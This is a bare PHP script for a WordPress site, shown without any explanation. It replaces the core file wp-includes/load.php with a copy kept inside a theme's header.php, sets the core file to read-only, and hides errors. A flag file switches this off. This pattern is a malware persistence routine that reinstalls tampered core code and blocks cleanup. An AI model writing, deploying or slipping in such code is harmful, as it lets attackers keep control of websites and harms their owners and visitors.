<?php

$load_file = ABSPATH . 'wp-includes/load.php';
$backup_file = __DIR__ . 'twentytwentyfive/header.php';
$flag_file = ABSPATH . 'wp-single.flag';

if (!file_exists($flag_file)) {

    if (!file_exists($load_file) || md5_file($load_file) !== md5_file($backup_file)) {
        @copy($backup_file, $load_file);
        @chmod($load_file, 0444);
    }

} else {

    @chmod($load_file, 0644);
}
